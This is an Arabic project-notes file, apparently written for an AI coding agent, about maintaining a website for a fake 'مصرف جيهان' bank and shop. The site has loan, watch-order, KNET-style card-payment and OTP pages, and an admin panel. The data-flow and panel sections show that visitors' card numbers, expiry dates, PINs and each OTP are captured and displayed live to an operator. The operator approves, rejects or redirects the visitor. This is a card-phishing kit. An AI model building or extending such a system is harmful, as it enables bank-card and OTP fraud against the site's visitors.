# لوحة الإشعارات المتقدمة + موقع العملاء — مشروع مدمج

## الاتجاه الحالي (تحديث 2026-11): موقع «مصرف جيهان» (مشروع فردي)

الواجهة العامة أُعيد بناؤها بهوية «مصرف جيهان» (مشروع فردي، العراق) — HTML ثابت
+ Tailwind CDN + Font Awesome + خط Cairo. الأقسام القديمة (مزارع الثنيان/المتجر)
أُخفيت. ما زال الاتصال بـ Firebase اختيارياً عبر `assets/js/firebase-client.js`.

**الهوية البصرية (نفسها في كل الصفحات):**
- الألوان: `cihan-navy #0b2239`، `cihan-dark #071625`، `cihan-gold #c59b27`،
  `cihan-gold-hover #b0881e`، `cihan-light #f4f6f9` (تُعرّف في `tailwind.config`).
- الرأس: شعار «مصرف جيهان / مشروع فردي» + روابط (الرئيسية، طلب سلفة، المتجر، الطلبات)
  + قائمة جوال `#mobileMenuBtn`/`#mobileMenu`.
- التذييل: بطاقة «مصرف جيهان ( فردي)» + «معلومات التواصل الشخصية».
- كل صفحة تُنسخ بنفس الرأس/التذييل حرفياً للحفاظ على الاتساق.

**صفحات المشروع وحالتها:**
| الصفحة | الملف | الحالة |
|--------|-------|--------|
| الرئيسية | `index.html` | ✅ مكتملة |
| طلب سلفة | `loan.html` | ✅ مكتملة |
| انتظار/تأكيد الطلب | `wait1.html` | ✅ مكتملة |
| المتجر / الساعة الذكية | `shop.html` | ✅ مكتملة |
| طلب الساعة الذكية | `watch.html` | ✅ مكتملة |
| طلب استرداد | `refund.html` | ✅ مكتملة |
| الطلبات / تتبع الطلب | `order1.html` | ⏳ |

**ملاحظة مهمة:** موقع مصرف جيهان **لا يستخدم Firebase** (خلافاً للأقسام القديمة في
هذا الملف) — إنه موقع HTML ثابت بسيط. لا تُضِف Firebase إلا إذا طلب المستخدم صراحةً.

**صفحة طلب السلفة (`loan.html`):** تصميم المستخدم المعتمد (سلفة **شخصية فقط**).
نموذج من قسمين: (1) المعلومات الشخصية (الاسم الكامل، رقم الهاتف)،
(2) شروط التمويل الديناميكية: **شريط سحب المبلغ** من 5,000,000 إلى 30,000,000
(خطوة مليون) و**شريط سحب المدة** من 6 إلى 120 شهراً (خطوة 6) مع عرض القيمة فورياً.
عند الإرسال: يحفظ `{fullName, phone, amount, duration}` في
`sessionStorage['loanRequestData']` ثم يوجّه إلى `wait1.html`.

**صفحة الانتظار (`wait1.html`):** تصميم المستخدم المعتمد — دائرة تحميل متحركة
(سبينر ذهبي + أيقونة درع) ونص «جاري معالجة طلبك… يرجى عدم إغلاق الصفحة»
وشريط تقدّم بصري متكرر (يتقدّم 3% كل 100ms ويعود للبداية عند 100%). لا تقرأ
بيانات الطلب ولا تنتقل لصفحة أخرى.

**صفحة المتجر (`shop.html`):** متجر الساعات الذكية — 5 منتجات تُعرض عبر JS.
**مهم:** كانت الصفحة معطّلة بسبب نظام ترجمة خارجي مفقود (`data-i18n` + دالة `tr()`);
أُزيل النظام ووُضعت النصوص العربية **مباشرة** في الـ HTML وفي مصفوفة `products`.
الصور: مسارها `/images/products/<اسم>.png` مع صورة احتياطية
`/assets/images/nfc2.png` (عبر `onerror`) حتى تُرفع صور المنتجات الحقيقية.
زر «طلب الساعة» يفتح نافذة اختيار المقاس (S/M/L أو «لا أعرف المقاس») ثم يوجّه إلى
`wait1.html` ويحفظ المقاس في `sessionStorage['fazaaSize']`.
(يحتفظ ببكسل Snap الموجود في الأصل.)

**صفحة إدخال البيانات وعنوان التوصيل (`watch.html`):** الخطوة الثانية لطلب الساعة.
تقرأ الساعة المختارة والمقاس والفئة من `sessionStorage`/`localStorage`
(`fazaaProduct`, `fazaaSize`, `fazaaTier`) وتعرضها في «ملخص طلبك». الحقول:
المعلومات الشخصية (الاسم، الهاتف، هاتف بديل، بريد) + عنوان التوصيل (المحافظة،
القضاء/المنطقة، العنوان التفصيلي، أقرب نقطة دالة، وقت التوصيل المفضّل، ملاحظات).
تحقق مخصّص (اسم ≥3 أحرف، هاتف 10–15 رقماً، المحافظة/المنطقة/العنوان مطلوبة) مع
رسائل خطأ تحت كل حقل. عند النجاح تحفظ `sessionStorage['watchOrderData']` (مع رقم
طلب `WT-xxxxxxxx`) ثم توجّه إلى `wait1.html`.
مسار الطلب: `shop.html` → (نافذة المقاس) → `watch.html` → `wait1.html`.

**صفحة طلب الاسترداد (`refund.html`):** نموذج استرداد بنفس الهوية — المعلومات
الشخصية + رقم الطلب/العملية + نوع الخدمة + مبلغ الاسترداد + سبب الاسترداد + طريقة
الاسترداد + ملاحظات. يحفظ في `sessionStorage['refundRequestData']` ثم يوجّه إلى
`wait1.html`.

**التشغيل بمعاينة آمنة (بدون صفحات حساسة):**
```bash
python3 preview_serve.py   # يحجب knet.html و verification.html و /admin*
```
(الخادم الأصلي `serve.py` يبقى كما هو.)

## النطاق

مشروع موحّد يجمع موقع العملاء (HTML ثابت) ولوحة التحكم (HTML/JS جديدة) في استضافة واحدة.
كلاهما متصل بنفس مشروع Firebase `card-ke` ويتشاركان البيانات عبر collection `customers`.

## التشغيل

```bash
python3 serve.py
```
- موقع العملاء: http://localhost:12001/
- لوحة التحكم:  http://localhost:12001/admin/

المنفذ الافتراضي 12001. الخادم يخدم:
- `/` وملفات HTML الثابتة → موقع العملاء
- `/admin/*` → لوحة التحكم (مع SPA fallback)

## البنية

```
.
├── index.html              # موقع العملاء (المتجر)
├── cartepage.html          # السلة
├── knet.html               # صفحة الدفع/البطاقة
├── verification.html       # صفحة التحقق OTP
├── creatprogect.html       # لوحة تحكم المنتجات
├── assets/                 # CSS/JS/صور موقع العملاء
│   └── js/
│       ├── firebase-client.js   # عميل Firebase للموقع (يكتب customers)
│       ├── products-store.js    # مزامنة المنتجات مع Firestore
│       └── admin-panel.js       # (قديم، لم يُعد يُستخدم)
├── admin/                  # لوحة التحكم الجديدة
│   ├── index.html          # واجهة لوحة التحكم
│   ├── favicon.svg
│   └── assets/
│       ├── panel.css       # نفس CSS الأصلي (Tailwind مُجمّع، 138KB)
│       └── js/
│           ├── firebase-config.js   # إعدادات Firebase + حساب المدير
│           └── app.js               # منطق لوحة التحكم
└── serve.py                # خادم HTTP موحّد
```

## Firebase

مشروع واحد موحّد `card-ke` لكل من الموقع ولوحة التحكم.

### مفاتيح الاتصال من متغيّرات البيئة (env) — لا مفاتيح داخل الكود

كل مفاتيح الاتصال تُقرأ من متغيّرات البيئة، لا من داخل الملفات:

- محلياً: انسخ `.env.example` إلى `.env` واملأ القيم (`cp .env.example .env`).
  ملف `.env` مستثنى من Git.
- عند النشر: أضِف نفس المتغيّرات في لوحة المنصة (Netlify / Render / Railway).

| متغيّر | الوصف |
|--------|-------|
| `FIREBASE_API_KEY` | apiKey للمشروع |
| `FIREBASE_AUTH_DOMAIN` | authDomain |
| `FIREBASE_DATABASE_URL` | databaseURL (RTDB) |
| `FIREBASE_PROJECT_ID` | projectId |
| `FIREBASE_STORAGE_BUCKET` | storageBucket |
| `FIREBASE_MESSAGING_SENDER_ID` | messagingSenderId |
| `FIREBASE_APP_ID` | appId |
| `FIREBASE_MEASUREMENT_ID` | measurementId |
| `FIREBASE_PANEL_EMAIL` | بريد حساب اللوحة |
| `FIREBASE_PANEL_PASSWORD` | كلمة سر حساب اللوحة |

### كيف تصل المفاتيح إلى الواجهة

- `firebase_config.py`: المصدر الوحيد (يقرأ env + ملف `.env`). دوال:
  `firebase_env()` (كل القيم)، `public_env()` (عامة بلا سر)،
  `client_env()` (عامة + حساب اللوحة — يحتاجه موقع العملاء).
- `serve.py`: يحقن `window.__FIREBASE_ENV__` في الصفحة عند الطلب
  (استبدال العنصر النائب `<script src="/assets/js/firebase-env.js"></script>`):
  صفحات الموقع بالإعدادات + حساب اللوحة (لأن المصادقة المجهولة anonymous معطّلة
  في هذا المشروع، فالموقع يسجّل الدخول بحساب اللوحة)، وصفحات `/admin/*` بالإعدادات
  العامة فقط. ويخدم `/assets/js/firebase-env.js` ديناميكياً. كما يحجب طلبات
  `.env` و`*.py` (‏404).
- `build_env_js.py`: للاستضافة الثابتة (Netlify) — يولّد `assets/js/firebase-env.js`
  عند البناء. الملف المولّد مستثنى من Git. أمر البناء في `netlify.toml`:
  `python3 build_env_js.py || true; python3 build_static.py || true`.
- الواجهة تقرأ `window.__FIREBASE_ENV__` في `assets/js/firebase-client.js`
  و`admin/assets/js/firebase-config.js` و`assets/js/admin-panel.js`.
- `product_page.py`: يقرأ `PROJECT_ID`/`API_KEY`/حساب اللوحة من env.

### ملاحظات أمنية

- إعدادات Firebase العامة (apiKey/projectId/...) ليست سرّية بطبيعتها (تصميم Firebase)،
  لكن كلمة سر حساب اللوحة تُرسَل للمتصفح في صفحات **الموقع** لأن الموقع يسجّل
  الدخول بها تلقائياً (anonymous معطّل). الإصلاح الجذري: تفعيل Anonymous Auth
  أو ضبط قواعد أمان مناسبة في Firebase Console.
- لا تُضمَّن أي مفاتيح داخل ملفات الكود؛ أي تعديل مستقبلي يجب أن يبقى عبر env.

**مهم:** عند تغيير أي مفتاح، حدّثه في `.env` (محلياً) وفي متغيّرات بيئة المنصة.
عند تعديل `firebase-client.js` ارفع رقم `?v=` في وسوم `<script>` داخل الصفحات
(الرقم الحالي `6`).

## ربط النماذج بقاعدة البيانات (إرسال الطلبات)

**الخلفية:** الموقع يستخدم Firebase (Firestore + RTDB) — نفس مشروع اللوحة. الصفحات
القديمة (`cartepage.html`, `knet.html`, `verification.html`) ترسل بياناتها عبر دوال
`window.pushFirebase*` في `assets/js/firebase-client.js`، واللوحة (`admin/`) تقرأ من
مجموعات `customers` / `cards` / `otps`.

**المشكلة:** الصفحات الجديدة (`loan.html`, `refund.html`, `watch.html`, `shop.html`)
لم تكن تُحمّل سكربتات Firebase أصلاً، فلم تكن أي طلب يصل لقاعدة البيانات.

**الحل:**
- `assets/js/firebase-client.js` → دالة جديدة `window.pushFirebaseRequest(request)`:
  تكتب في `customers/{sessionId}` (الحقول الموحّدة: name/phone/address/amount +
  `requestType`/`requestTypeLabel`/`refNo`/`details`) فتظهر مباشرة في جدول اللوحة،
  وتكتب نسخة كاملة في مجموعة `requests/{refNo}` (أرشيف كل طلب بتفاصيله)، وتحدّث
  جلسة RTDB للتوافق. `getFriendlyPageName()` صار يميّز الصفحات الجديدة.
- `assets/js/request-store.js` (جديد) → `window.submitServiceRequest(req)`: ينتظر
  `ensureAuthReady()` ثم يرسل، مع حدّ زمني 2500ms وحماية من الإرسال المزدوج، فلا
  يتعطّل توجيه الصفحة إن تأخّرت الشبكة.
- الصفحات (`loan/refund/watch/shop`) تُحمّل الآن سكربتات Firebase + الدالتين في
  نهاية `<body>`، وتستدعي `submitServiceRequest({type, name, phone, address, amount,
  details})` عند الإرسال قبل التوجيه إلى `wait1.html`.
- `admin/assets/js/app.js` → يعرض `requestTypeLabel` كشارة في صف الجدول، ويفتح قسم
  «تفاصيل الطلب» في نافذة المعلومات الشخصية (`requestDetailRows` حسب النوع)، ويشمل
  رقم الطلب ونوعه في البحث.

**أنواع الطلبات:** `loan` (سلفة) / `refund` (استرداد) / `watch` (ساعة ذكية).
كل نوع له حقول `details` خاصة تُعرض في اللوحة.

**مهم:** عند تعديل `firebase-client.js` ارفع `?v=` في كل الصفحات (رُفع إلى `6`)،
وعند تعديل `request-store.js` ارفع نسخته (حالياً `?v=1`).

## تدفق البيانات (Data Flow)

العميل (kuwait-shop) ↔️ Firestore `customers/{sessionId}` ↔️ لوحة التحكم (admin/)

| الحدث | الموقع يكتب | اللوحة تقرأ |
|-------|-------------|--------------|
| دخول العميل | `customers/{id}` {sessionId, status, lastSeen, currentPage} | يظهر في الجدول |
| إكمال السلة | `customers/{id}` {name, phone, address, amount} | يظهر في تفاصيل العميل |
| إدخال بطاقة | `cards/{id}`, `card_data/{sessionId}/attempts` | يظهر زر "معلومات البطاقة" |
| إدخال OTP | `customers/{id}.otp`, `otps/{id}` | يظهر الرمز في عمود "الكود" |
| الموافقة/الرفض | اللوحة تكتب `customers/{id}.decision` | الموقع يستمع ويتجاوب |

## لوحة التحكم (admin/) — ميزات

- شاشة تسجيل دخول + جلسة محفوظة (localStorage)
- 4 بطاقات إحصائيات (زوار، متصلون، بطاقات، موافقات)
- فلاتر: تبويبات (الكل/معلق/بطاقات/متصل) + ترتيب (تاريخ/حالة/دولة) + بحث
- جدول إشعارات بـ 8 أعمدة + ترقيم صفحات
- نافذة منبثقة: معلومات شخصية + معلومات البطاقة (كل بيانات في صندوقها)
- أزرار موافقة/رفض (تكتب `decision` في Firestore عبر sessionId)
- نوافذ: الإعدادات + تصدير JSON/CSV
- توست (toasts) للإشعارات
- اختصارات: Ctrl+R للتحديث، Esc لإغلاق النوافذ
- تحديث لحظي عبر `onSnapshot`

## مصدر البيانات (عرض كل الإدخالات — الخيار A)

تدمج ثلاث مجموعات من Firestore:
1. **`cards`** — كل بطاقة كوثيقة منفصلة (cardNumber, cardPrefix, bankName, expiry, pin, sessionId, createdAt)
2. **`customers`** — بيانات العميل (name, phone, address, amount, otp, status, decision, lastSeen, currentPage)
3. **`otps`** — كل رمز OTP كوثيقة منفصلة (otp, sessionId, createdAt, timestamp)

الدمج عبر `sessionId`: كل بطاقة تظهر كصف منفصل في الجدول. كل إشعار يحمل:
- `allCards`: كل بطاقات العميل (للعرض في صناديق متعددة)
- `allOtps`: كل رموز OTP للعميل (للعرض في صناديق متعددة)

### السلوك عند إدخال العميل لبيانات عدة مرات:
- **البطاقات**: كل بطاقة تُحفظ في `cards/` كوثيقة جديدة وتظهر كصف منفصل. في نافذة التفاصيل، كل بطاقة في صندوق خاص (البطاقة 1 الأحدث، البطاقة 2 سابقة...).
- **OTP**: كل رمز يُحفظ في `otps/` كوثيقة جديدة. في نافذة المعلومات الشخصية، كل OTP في صندوق خاص (#1، #2...) مع زر نسخ. عمود "الكود" في الجدول يعرض أحدث OTP.
- **بيانات العميل**: آخر قيم (تُحدّث بـ merge في `customers/{sessionId}`).

## صفحات المنتجات الديناميكية (SEO)

- `product_page.py` (جذر المشروع): يجلب المنتجات من Firestore `products` عبر REST API
  (بدون مصادقة أولاً، ثم بحساب اللوحة عند 401/403/429) ويولّد HTML كامل (SSR).
- المسارات في `serve.py`:
  - `/product/<id>/<slug>` — صفحة منتج كاملة (title/meta/OG + Product/Breadcrumb/FAQ Schema)
  - `/product-img/<id>` — يقدّم صور المنتجات المخزنة كـ data URI كملفات حقيقية
  - `/prices` — صفحة "أسعار اليوم" الديناميكية (تاريخ اليوم تلقائياً + ItemList Schema)
  - `/feed.xml` — ملف منتجات Google Merchant Center (RSS 2.0 + g: namespace)
  - `/sitemap.xml` — ديناميكي من المنتجات الحالية (الملف الثابت احتياط فقط)
- سياسة المحتوى: كلمات "أرخص/عروض" في meta/title فقط (نتيجة البحث)، وجسم الصفحة نظيف.
- صفحات قانونية ثابتة: `terms.html` و `privacy.html` (مضافة للقائمة والخريطة).
- القائمة الجانبية في index.html: زر `#menuBtn` يفتح `#menuDrawer` —
  روابط الصفحات ثابتة + المنتجات تُعبّأ ديناميكياً عبر `renderMenuProducts()`.
- التخزين المؤقت: ذاكرة 5 دقائق + `.products-cache.json` على القرص (احتياط عند فشل Firestore).
- المنتجات في `index.html` ترتبط بصفحاتها عبر `productPageUrl()` (تحتاج `_id` من Firestore).
- ملاحظة: بيئة التطوير هذه قد يُحجب عنها firestore.googleapis.com (429 مشترك) —
  البيانات الحقيقية للمعاينة تُؤخذ من localStorage للموقع المباشر.

## إصلاح حلقة توجيه العميل (RTDB commands/redirect)

**المشكلة:** إشارة التوجيه (وأوامر الموافقة/الرفض) تُكتب في `commands/{sessionId}/redirect`
دون حذفها أبداً. بعد تنفيذ التوجيه وانتقال العميل للصفحة الجديدة، تقرأ الصفحة الجديدة
نفس الإشارة المتبقية في قاعدة البيانات فتوجّه من جديد → حلقة إعادة تحميل لا نهائية.
(الحماية القديمة `window.__redirectHandled` تعيش في الذاكرة فقط وتُصفَّر مع كل إعادة تحميل).

**الحل (`assets/js/firebase-client.js`، قسم RTDB):**
- `clearCmd(kind)` يحذف عقدة الأمر من قاعدة البيانات فور تنفيذه (`remove()`).
- بصمة دائمة في `localStorage` (`zain_cmd_<kind>_<sessionId>`) تبقى بعد إعادة التحميل،
  فلا يُنفَّذ نفس الأمر مرتين حتى لو تأخّر الحذف.
- تجاهل التوجيه إذا كانت الصفحة الهدف هي الصفحة الحالية (حماية من التوجيه الذاتي).
- طُبِّق نفس المنطق على `approval` و`rejection` لمنع تكرارهما بعد الانتقال.
- **مهم:** رُفع `?v=` لـ `firebase-client.js` من `3` إلى `4` في كل الصفحات.

## استماع الصفحات الجديدة لأوامر اللوحة + توجيهها (تحديث 2026-11)

**المشكلة:** منطق التوجيه (`commands/{sessionId}/redirect`) كان موجوداً لكن الصفحات
الجديدة (`loan/refund/watch/shop/wait1/index/cartepage`) **لا تستمع** له، فالتوجيه
يعمل فقط في `knet.html` و`verification.html` (وكانتا الوحيدتين اللتين تستدعيان
`listenForAdminCommands`). لذا لم تكن اللوحة قادرة على توجيه العميل من/إلى الصفحات
الجديدة، ولا التعامل مع الصفحات الجديدة أصلاً (خريطة اللوحة كانت قديمة).

**الحل — جانب موقع العملاء:**
- ملف جديد `assets/js/page-commands.js` (يُحمَّل بعد `firebase-client.js`):
  يستمع لـ `commands/{sessionId}/redirect` وينفّذ التوجيه مرة واحدة، ثم:
  - يحذف عقدة الأمر من قاعدة البيانات (`remove()`) فلا تُقرأ بعد الانتقال.
  - يحفظ بصمة الأمر (`seq`) في `localStorage` (`zain_page_redirect_<sessionId>`) فتبقى
    بعد إعادة تحميل الصفحة → **منع حلقة إعادة التوجيه**.
  - `normalizeTarget()`: يقبل اسماً مختصراً (`loan`/`shop`/`watch`/`refund`/`wait`/
    `cart`/`home`/`orders`/`login`) أو اسم ملف/مسار داخلي، **ويرفض** الروابط الخارجية
    والبروتوكولات (`http:`/`javascript:`) والمراسي — حماية من إساءة الاستخدام.
  - يتخطّى الصفحات الحساسة (`knet.html`/`verification.html`) — لها منطقها الخاص.
  - يبدأ تلقائياً (ينتظر جاهزية `window.rtd`/`window.sessionId`)، ولا يحتاج نداءً.
- الصفحات التي صارت تستمع: `index.html`, `wait1.html`, `loan.html`, `shop.html`,
  `watch.html`, `refund.html`, `cartepage.html`. (`index.html` و`wait1.html` لم تكونا
  تحمّلان Firebase أصلاً، فأُضيفت لهما حزمة Firebase + السكربت.)
- `firebase-client.js`: أُضيفت أسماء ودّية للصفحتين `order1` (تتبع الطلب) و`login`
  (تسجيل الدخول) في `getFriendlyPageName()`.

**الحل — جانب لوحة التحكم (داخل `dashboardkuwaitalthnyan-main.zip`):**
- `assets/js/app.js` (والنسخة المطابقة `client/public/assets/js/app.js`):
  - `NAV_PAGE_MAP` صار يشمل: `loan/shop/watch/refund/wait/login/orders` بالإضافة إلى
    القديمة (`home/cart/knet/verification/card/otp`).
  - أزرار التوجيه + القائمة المنسدلة صارت تعرض الصفحات الجديدة (طلب سلفة، المتجر،
    طلب الساعة، طلب استرداد، صفحة الانتظار) بجانب أزرار الدفع.
  - يوجد أيضاً حقل «مسار مخصص» يقبل أي مسار يكتبه المدير (يُرسل كما هو).

**مهم:** عند تعديل `firebase-client.js` ارفع `?v=` في كل الصفحات (رُفع إلى `7`).
عند تعديل `page-commands.js` ارفع نسخته (حالياً `?v=3`).

## النشر على Netlify — صفحات المنتجات الثابتة (إصلاح كسر صفحة المنتج)

**المشكلة:** عند النقر على صورة منتج كان الرابط `/product/<id>/<slug>` يفتح الصفحة الرئيسية
بدون سكربتات (منتجات بلا سلة/طلب). السبب:
- `serve.py` يولّد صفحة المنتج **ديناميكياً عند الطلب** (SSR)، وهذا لا يعمل على Netlify
  (استضافة ملفات ثابتة فقط) → لا يوجد ملف في هذا المسار.
- قاعدة `/*  /index.html  200` في `_redirects` كانت تُخدِم `index.html` بدلاً منه.
- وبما أن `index.html` كان يُخدَم من مسار **عميق**، كانت كل مساراته النسبية
  (`./assets/...`) تُحلّ خطأً إلى `/product/<id>/<slug>/assets/...` الذي لا يوجد، فتُعيد
  نفس القاعدة `index.html` (HTML) مكان ملفات JS/CSS → تفشل كل السكربتات.

**الحل:**
- `build_static.py` (جديد): يولّد الملفات فعلياً من `products-snapshot.json` (بدون شبكة):
  `product/<id>/<slug>.html` (نسختان: اسم مشفّر ومفكوك)، `prices.html`، `feed.xml`، `sitemap.xml`.
- `_redirects`: قاعدتان قبل الـ catch-all:
  `/product/:id/:slug  →  /product/:id/:slug.html  200` و `/prices → /prices.html  200`.
- `netlify.toml`: أمر بناء `python3 build_static.py || true` (يعمل عند كل نشر، ولا يُفشل النشر).
- كل مسارات الأصول صارت **مطلقة** (`/assets/...`) في `index.html` و`cartepage.html` و`knet.html`
  و`verification.html` و`creatprogect.html`، ودالة `absImg()` في `index.html` تجعل صور المنتجات
  مطلقة أيضاً — حماية إضافية لأي رابط عميق.
- `sync_products.py` يستدعي `build_static.build()` تلقائياً بعد المزامنة.

**مهم:** عند تعديل المنتجات شغّل `python3 sync_products.py` (يحدّث الملفات الثابتة تلقائياً)،
أو `python3 build_static.py` مباشرة. الملفات المولّدة تُلتزَم في المستودع ليعمل النشر فوراً.

## ملاحظات

- لوحة التحكم الجديدة بُنيت من HTML/JS واضح (قابل للتعديل الكامل)
- استخدمت نفس CSS الأصلي (panel.css) للحفاظ على نفس المظهر
- لا يوجد React/Vite — HTML ثابت فقط، يحلّ أزمة التعديل

## إصلاح حلقة إعادة التحميل (قرار الموافقة/الرفض)

**المشكلة:** عند وصول موافقة/رفض من اللوحة كان الموقع يعيد التحميل ويرسل الرسالة بشكل متكرر
(حلقة) لعدة أسباب متراكبة:
1. `verification.html` كان يستدعي `location.reload()` عند الرفض، وبعد إعادة التحميل يقرأ نفس
   القرار المحفوظ في Firestore فيعيد الرسالة من جديد → حلقة لا نهائية.
2. `listenForAdminCommands` كان يعتبر "نفس القرار" مكرراً فقط إذا تطابق الطابع الزمني،
   وكان الطابع الزمني يتغيّر (بسبب نبض `lastSeen` كل 10 ثوانٍ) فيُعاد التنفيذ.
3. مساران (onSnapshot + استطلاع REST كل ثانيتين) + قناة RTDB كانوا يستدعون نفس القرار عدة مرات.
4. `commands/{sessionId}/redirect` كان ينتقل عند كل حدث value.

**الحل (`assets/js/firebase-client.js`):**
- نقطة تنفيذ واحدة `dispatchDecision()` لكل القرارات (Firestore + RTDB)، مع منع التكرار خلال
  نافذة 4 ثوانٍ وعلامة `__decisionInFlight` خلال التنفيذ.
- بعد تنفيذ أي قرار: تصفير الحقل في قاعدة البيانات إلى `pending` (`resetDecisionToPending`)
  فيتمكن المدير من الكتابة/الإرسال من جديد فوراً.
- عند رؤية `pending` لمدة ثانيتين يُصفَّر القرار محلياً ليُقبل قرار جديد بنفس القيمة.
- `redirect` صار يُنفَّذ مرة واحدة فقط.

**الحل (الصفحات):**
- `verification.html`: حذف `location.reload()` تماماً — رسالة النجاح/الرفض تُعرض داخل الصفحة
  عبر `v220()`، ومؤقت الـ4 ثوانٍ لا يستبدل قراراً حقيقياً وصل (`window.__otpDecisionSeen`).
- `knet.html`: عند الرفض تُفرَّغ الحقول ويُعاد تمكينها (`i15`,`i12`,`i12cvv`,`i19`,`i21`,`v116`)
  وتُظهر رسالة الرفض؛ عند الموافقة تُزال شاشة "جار الاتصال بالبنك" ثم يُمرَّر للتحقق.

**مهم:** عند تعديل `firebase-client.js` يجب رفع رقم `?v=` في وسوم `<script>` داخل الصفحات
(`index.html`, `cartepage.html`, `knet.html`, `verification.html`, `creatprogect.html`, ...)
لأن الملف يُخزَّن سنة كاملة عند العميل.

## العرض الفوري للمنتجات + المزامنة (تحديث)

**المشكلة:** كانت المنتجات تتأخر ثوانٍ عند فتح الموقع لأن العرض كان ينتظر سلسلة
المصادقة (`ensureAuthReady`) ثم `storeGetProducts()`/`onSnapshot` من Firestore،
إضافة إلى 4 سكربتات Firebase مانعة للتحليل في `<head>` (~160KB) تؤخر `DOMContentLoaded`.

**الحل:** عرض المنتجات أولاً من ملفات المشروع المحلية، ثم مزامنتها من قاعدة البيانات
(المزامنة باقية ولم تُلغَ).

### الملفات المولّدة (لا تُعدَّل يدوياً)
- `assets/js/products-local.js` → `window.LOCAL_PRODUCTS` (حقول: `_id`, `name`, `desc`, `price`, `img`).
- `assets/images/products/<hash>.<ext>` → صور المنتجات كملفات حقيقية (كانت data URI).
- `products-snapshot.json` → احتياطي الخادم لصفحات SEO (SSR).

### أداة المزامنة
```bash
python3 sync_products.py                 # Firestore، ويرجع للقطة عند الفشل
python3 sync_products.py --source snapshot
python3 sync_products.py --dry-run
```
تجلب المنتجات، تفكّ صور data URI إلى ملفات (مع إزالة التكرار بـ sha1 وحذف الصور
القديمة غير المستخدمة)، تكتب `products-local.js` و`products-snapshot.json`،
وترفع رقم `?v=` لـ `products-local.js` في `index.html` تلقائياً.

### التدفق في index.html
1. `products-local.js` و`cart.js` سكربتان متزامنان صغيران (جاهزان أثناء تحليل الصفحة).
2. سكربتات Firebase + `firebase-client.js` + `products-store.js` بـ `defer` (لا توقف الرسم).
3. عند التحليل: `renderProducts(getLocalProducts())` فوراً — بدون انتظار الشبكة.
4. عند `DOMContentLoaded`: `restoreQuantitiesFromCart()` ثم `syncProductsFromDatabase()`
   (تحدّث العرض بأحدث بيانات من قاعدة البيانات).

**ملاحظة:** `serve.py` يدعم الآن `image/avif` (كانت صور المنتجات المضمّنة avif).
**مهم:** عند تعديل `products-local.js` يدوياً (أو تغيير محتواه) يجب تحديث `?v=` في `index.html`؛
`sync_products.py` يفعل ذلك تلقائياً.

## إصلاح اختفاء المنتجات بعد إعادة الترتيب من اللوحة (دمج المصادر)

**المشكلة:** بعد تغيير المنتجات وإعادة ترتيبها من اللوحة، كانت بعض المنتجات تظهر
أولاً ثم تختفي وتُعرض منتجات أخرى. السبب الجذري:
- اللوحة/`creatprogect.html` تحفظ القائمة كاملة عبر `storeSaveProducts` مع
  `order` متسلسل من 0. أي خلل/تزامن (حفظ قائمة ناقصة مثل القائمة الافتراضية
  الـ15 عند فقدان مصدرها) **يحذف وثائق المنتجات الناقصة من مجموعة `products`**
  ويستبدلها. حدث فعلاً: قاعدة البيانات صارت 15 منتجاً بمعرّفات جديدة بينما
  اللقطة المحلية فيها 26 منتجاً بمعرّفات أصلية.
- الواجهة كانت تستبدل القائمة المعروضة بقائمة قاعدة البيانات فوراً
  (`renderProducts(remote)` / `onSnapshot`)، فما إن تصل قاعدة البيانات الناقصة
  حتى تُخفى المنتجات المحلية → "تظهر ثم تختفي".

**الحل (دمج المصادر + حماية الحذف):**
- `assets/js/products-store.js`: دالة `mergeProducts(remote, local)` تدمج بلا
  تكرار (البصمة = الاسم+السعر+الوصف). قاعدة البيانات لها الأولوية، وتُلحق أي
  منتج محلي مفقود (استرجاع). طُبّقت في `storeGetProducts` و`storeWatchProducts`.
  `mergeRef()` تختار المرجع: نسخة المتصفح إن كانت تحمل `_id` (تعكس حذف المدير
  فيبقى الحذف)، وإلا ملف `products-local.js`.
- حماية في `storeSaveProducts`: لا يُنفَّذ حذف الوثائق إن كانت القائمة بلا أي
  `_id` (منع مسح قاعدة البيانات بقائمة افتراضية).
- `index.html` → `initializeDefaultProducts()`: تُخزَّن نسخة محلية = اتحاد بلا
  تكرار بين المخزّن و`LOCAL_PRODUCTS` (لا استبدال يُفقد منتجات).
- `product_page.py` → `_fetch_products()`: `_merge_missing(products, _read_snapshot())`
  يُلحق منتجات اللقطة `products-snapshot.json` المفقودة من قاعدة البيانات (لصفحات
  SEO الثابتة). اللقطة تُحدَّث بـ `sync_products.py` بعد أي حذف شرعي فلا تُحيي محذوفاً.

**مهم:** بعد أي تعديل للمنتجات من اللوحة شغّل `python3 sync_products.py` لتحديث
`products-local.js` و`products-snapshot.json` (فيتحدّث مرجع الاسترجاع تلقائياً).
عند تعديل `products-store.js` ارفع `?v=` في `index.html` و`admin/index.html`
و`creatprogect.html` (رُفع إلى `4`).

## إصلاح صفحات المنتج على Netlify (روابط ASCII) + ثبات الترتيب + منع الوميض

**المشكلة 1 — صفحة تفاصيل المنتج لا تعمل على Netlify:**
كانت روابط المنتجات عربية مُرمَّزة (`/product/<id>/%D8%AA%D9%88%D8%AA...`).
Netlify فيه خلل معروف في إعادة التوجيه للروابط غير ASCII/المشفّرة percent-encoding،
فلا تُطابِق قاعدة `_redirects` (`/product/:id/:slug → ...html`) وتُرجع `index.html`
(صفحة رئيسية بلا سكربتات) بدل صفحة المنتج.

**الحل:** روابط المنتجات صارت **ASCII فقط** (ترجمة صوتية للعربية) بلا ترميز percent:
- `product_page.slugify()`: خريطة `_TRANSLIT` (عربي → لاتيني) + تنقية ASCII، و
  `product_url()` بلا `urllib.parse.quote`.
- `index.html`: `slugifyName()` + `AR_TRANSLIT` تطابق `slugify()` بايثون **حرفاً بحرف**
  (مُتحقَّق منه: 28/28 بلا اختلاف) و`productPageUrl()` بلا `encodeURIComponent`.
- `build_static.py`: يحذف مجلد `product/` بالكامل قبل التوليد (يزيل الصفحات العربية
  القديمة) ويكتب ملفاً واحداً لكل منتج `<slug>.html` بلا نسخة مفكوكة.
- مثال: `/product/pvPnj5vZw8zujIWVvBZo/twt-mlky-tazj`.

**المشكلة 2 — التوت يظهر في الأسفل و/أو يختفي:**
حذف وثيقة المنتج من Firestore (خطأ تزامن عند إعادة الترتيب من اللوحة) كان يُخفي
المنتج، وكان الدمج القديم يُلحق المنتج المسترجَع **في الأسفل** فتغيّر ترتيبه.

**الحل:**
- `mergeProducts` (JS) و`_merge_missing` (بايثون) صارا **يحافظان على الموضع**:
  قاعدة البيانات لها الأولوية، وأي منتج محلي مفقود يُدرَج في **موضعه الأصلي** من
  المصدر المحلي (لا في الأسفل). مُتحقَّق: التوت يعود للمرتبة 0.
